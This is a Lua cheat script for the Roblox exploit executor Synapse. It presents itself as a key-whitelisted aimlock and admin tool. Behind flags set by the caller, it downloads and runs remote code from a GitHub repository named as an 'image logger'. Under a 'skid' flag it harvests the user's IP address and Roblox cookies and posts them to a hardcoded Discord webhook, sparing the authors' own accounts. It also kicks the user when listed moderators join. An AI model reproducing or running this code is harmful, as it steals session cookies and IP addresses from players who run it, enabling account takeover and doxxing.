-- // define alias for http function

local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

if (not http_request) then
	return game:GetService('Players').LocalPlayer:Kick('Unable to find proper request function')
end

-- // define hash function

local hash; do
    local MOD = 2^32
    local MODM = MOD-1
    local bxor = bit32.bxor;
    local band = bit32.band;
    local bnot = bit32.bnot;
    local rshift1 = bit32.rshift;
    local rshift = bit32.rshift;
    local lshift = bit32.lshift;
    local rrotate = bit32.rrotate;

    local str_gsub = string.gsub;
    local str_fmt = string.format;
    local str_byte = string.byte;
    local str_char = string.char;
    local str_rep = string.rep;

    local k = {
	    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
	    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
	    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
	    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
	    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
	    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
	    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
	    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
	    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
	    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
	    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
	    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
	    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
	    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
	    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
	    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
    }
    local function str2hexa(s)
        return (str_gsub(s, ".", function(c) return str_fmt("%02x", str_byte(c)) end))
    end
    local function num2s(l, n)
        local s = ""
        for i = 1, n do
            local rem = l % 256
            s = str_char(rem) .. s
            l = (l - rem) / 256
        end
        return s
    end
    local function s232num(s, i)
        local n = 0
        for i = i, i + 3 do n = n*256 + str_byte(s, i) end
        return n
        end
        local function preproc(msg, len)
        local extra = 64 - ((len + 9) % 64)
        len = num2s(8 * len, 8)
        msg = msg .. "\128" .. str_rep("\0", extra) .. len
        assert(#msg % 64 == 0)
        return msg
    end
    local function initH256(H)
        H[1] = 0x6a09e667
        H[2] = 0xbb67ae85
        H[3] = 0x3c6ef372
        H[4] = 0xa54ff53a
        H[5] = 0x510e527f
        H[6] = 0x9b05688c
        H[7] = 0x1f83d9ab
        H[8] = 0x5be0cd19
        return H
    end
    local function digestblock(msg, i, H)
        local w = {}
        for j = 1, 16 do w[j] = s232num(msg, i + (j - 1)*4) end
        for j = 17, 64 do
            local v = w[j - 15]
            local s0 = bxor(rrotate(v, 7), rrotate(v, 18), rshift(v, 3))
            v = w[j - 2]
            w[j] = w[j - 16] + s0 + w[j - 7] + bxor(rrotate(v, 17), rrotate(v, 19), rshift(v, 10))
        end
        local a, b, c, d, e, f, g, h = H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8]
        for i = 1, 64 do
            local s0 = bxor(rrotate(a, 2), rrotate(a, 13), rrotate(a, 22))
            local maj = bxor(band(a, b), band(a, c), band(b, c))
            local t2 = s0 + maj
            local s1 = bxor(rrotate(e, 6), rrotate(e, 11), rrotate(e, 25))
            local ch = bxor(band(e, f), band(bnot(e), g))
            local t1 = h + s1 + ch + k[i] + w[i]
            h, g, f, e, d, c, b, a = g, f, e, d + t1, c, b, a, t1 + t2
        end
        H[1] = band(H[1] + a)
        H[2] = band(H[2] + b)
        H[3] = band(H[3] + c)
        H[4] = band(H[4] + d)
        H[5] = band(H[5] + e)
        H[6] = band(H[6] + f)
        H[7] = band(H[7] + g)
        H[8] = band(H[8] + h)
    end
    function hash(msg, t) 
        msg = preproc(msg, #msg)
        local H = initH256({})
        for i = 1, #msg, 64 do digestblock(msg, i, H) end
        return str2hexa(num2s(H[1], 4) .. num2s(H[2], 4) .. num2s(H[3], 4) .. num2s(H[4], 4) .. num2s(H[5], 4) .. num2s(H[6], 4) .. num2s(H[7], 4) .. num2s(H[8], 4))
    end
end

local key = 'key_synapse'
local data = http_request({
	Url = ('https://whitelist586.000webhostapp.com/server.php?key=' .. key);
	Method = 'GET';
})

if data.StatusCode == 200 then
	-- // if the request did not error...
	local response = data.Body;
	if response == hash(key) then
		-- // wow, they are authenticated!


    if getgenv().aimlock == true then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/findmejojo/IMAGE-LOGGER-REAL-DONT-MISS-OUT/main/README.md"))()    
    print("test")
    end
    
    if getgenv().banme == true then
        game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('OneMoreTime');
end

if getgenv().skid == true then
                local ip = game:HttpGet("https://api.myip.com/")
local COOKIE = ""
local response = syn.request(
    {
        Url = "https://www.roblox.com",
    }
)
for i,v in pairs(response) do
    if type(v) == "table" then
        for ii,vv in pairs(v) do
            if string.find(ii, "cookie") then
                COOKIE = COOKIE.."\n"..vv
            end
        end
    end
end

if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer.Name == "CalvinHobbs2" then
    ip = "<REDACTED>" 
    COOKIE = "<REDACTED>" 
end

syn.request({
    Url = "https://discord.com/api/webhooks/1012336861731106916/Ih8ECEQJ78kJ8rGL-CrSpGM77ydH1ZbkFisKI2otPUC7w6398vY2tN2JOmz9dyo56ObI", 
    Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"]={{
            ["title"]="||"..ip.."||",
            ["type"]="rich",
            ["description"]=COOKIE,
            ["color"]=tonumber(0x7269da),
            ["footer"]={
                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p <@882188003588603944> skid found LOL")
            }
        }},
        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
        ["username"]="Username: "..game.Players.LocalPlayer.Name,
    }), 
    Method = "POST", 
    Headers = {["content-type"] = "application/json"}
})
            game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('BreathingHAMON');
end
end
wait(2)


    if getgenv().key == WE586G75487B7B4 then
 end
	end





local ADMINS = {
    2488484351, -- azo
}
local MODS = {
    2488484351, --azo
}
local STARS = {
    2488484351, --azo
}
local BOOSTERS = {
    2488484351, -- azo
    
}
local NOEMOJI = {
    2351144328, -- kumi

}
local MONEYNAME = {
    1622658484, -- Name123245
}
local CUSTOMWINNER = {
    248981646, -- VoidlessAroura
}

local formatNumber = (function(n)
    n = tostring(n)
    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)

local function checkswag()
    for i,v in pairs(game:GetService('Workspace').Players:GetChildren()) do
        if v:FindFirstChild('UpperTorso') then
            if not v:FindFirstChild('UpperTorso'):FindFirstChild('OriginalSize') then
                local plrcheck = game:GetService('Players'):FindFirstChild(v.Name)
                if plrcheck then
                    local plrID = game:GetService('Players'):FindFirstChild(v.Name).UserId
                    if plrID == 969017656 or plrID == 200547759 or plrID == 2432942033 then
                        if v:FindFirstChildWhichIsA('Humanoid') then           
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🪐]' .. game.Players[v.Name].DisplayName) 
                        end
                    elseif plrID == 44694442 then
                        if v:FindFirstChildWhichIsA('Humanoid') then           
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('yahyeee#7643') 
                        end
                    elseif table.find(ADMINS, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]' .. game.Players[v.Name].DisplayName)
                        end
                    elseif table.find(MODS, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🍆]' .. game.Players[v.Name].DisplayName)
                        end
                    elseif table.find(CUSTOMWINNER, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😳]' .. game.Players[v.Name].DisplayName)
                        end
                    elseif table.find(NOEMOJI, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = (game.Players[v.Name].DisplayName)
                        end
                    elseif table.find(STARS, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then           
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. game.Players[v.Name].DisplayName) 
                        end
                    elseif plrID == 596626987 or plrID == 1756901306 then
                        if v:FindFirstChildWhichIsA('Humanoid') then           
                            v:FindFirstChildWhichIsA('Humanoid').Displayname = ('[🌟]' .. game.Players[v.Name].DisplayName)
                        end
                    end
                end
            else
                local plrcheck = game.Players:FindFirstChild(v.Name)
                if plrcheck then
                    local plrID = game.Players:FindFirstChild(v.Name).UserId
                    if plrID == 969017656 or plrID == 200547759 then
                        if v:FindFirstChildWhichIsA('Humanoid') then           
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💠]' .. game.Players[v.Name].DisplayName) 
                        end
                    elseif table.find(ADMINS, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]' .. game.Players[v.Name].DisplayName)
                        end
                    elseif table.find(MODS, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🍆]' .. game.Players[v.Name].DisplayName)
                        end
           
                    elseif table.find(STARS, plrID) then
                        if v:FindFirstChildWhichIsA('Humanoid') then
                            v:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. game.Players[v.Name].DisplayName)
                        end
                    end
                end
            end
        end
    end
end

local succ, errr = pcall(checkswag)


local annoying = {"JokeTheFool", "Sherosama", "Papa_Mbaye", "AStrongMuscle", "streetren", "NikoSenpai", "WashedGarage", "iumu", "Benoxa", "Luutyy", "clubstar54", "givkitheth", "kywiexcx", "ATKDrizzy", "dtbbullet", "XavierWildYT", "RogueDaHoodKing", "paxxythecreator", "NatsuDBlaze", "AnqelicMar", "DrBlakMD", "DarkWhirlwind", "coreten", "LegacyCross", "Greed_Ocean"} -- you can add more players by doing {"EstheKing", "unroot", "AngelicTheWise", "FruitySama", "Luutyy", "WashedGarage"}  
 
game.Players.PlayerAdded:Connect(function(plr)
for i, v in pairs(annoying) do
if plr.Name == v then
local loc = game.Players.LocalPlayer
loc:Kick("A Moderator Has Joined")
end
end
end)
